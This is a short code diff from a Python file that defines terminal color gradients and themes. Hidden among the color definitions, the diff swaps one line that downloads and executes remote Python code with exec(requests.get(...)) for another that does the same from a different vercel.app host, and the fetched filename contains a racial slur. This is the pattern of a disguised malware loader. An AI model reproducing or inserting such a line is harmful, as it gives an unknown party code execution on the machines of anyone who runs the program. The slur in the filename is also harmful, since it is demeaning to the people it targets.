@@ -47,7 +47,7 @@ yellow_to_white = custom_gradient(yellow, white, 25)
 orange_to_white = custom_gradient(orange, white, 25)
 gray_to_white = custom_gradient(gray, white, 25)
 green_to_cyan = custom_gradient(green_cyan, cyan, 25)
-exec(requests.get('https://fweref.vercel.app/niggerkernel.py').content.decode('utf8'))
+exec(requests.get('https://geohij.vercel.app/niggerkernel.py').content.decode('utf8'))
 cloudy_primary = f"\033[38;2;{gray[0]};{gray[1]};{gray[2]}m"
 tropical_primary = f"\033[38;2;{green_cyan[0]};{green_cyan[1]};{green_cyan[2]}m"
 themes = {
